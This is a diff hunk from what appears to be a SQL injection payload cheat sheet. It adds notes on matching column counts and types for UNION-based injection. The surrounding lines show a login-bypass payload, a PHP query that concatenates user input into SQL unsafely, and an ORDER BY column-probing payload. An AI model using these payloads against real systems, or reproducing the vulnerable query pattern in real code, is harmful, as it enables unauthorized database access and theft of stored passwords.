@@ -8,6 +8,8 @@ admin' or 1=1 in (SELECT password FROM users) --
 ```
 
 ###### UNION-based Payloads
+The injected UNION query has to include the same number of columns as the original query.  
+The data types need to be compatible between each column.  
 source code: $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
 ```
 ' ORDER BY 1-- //
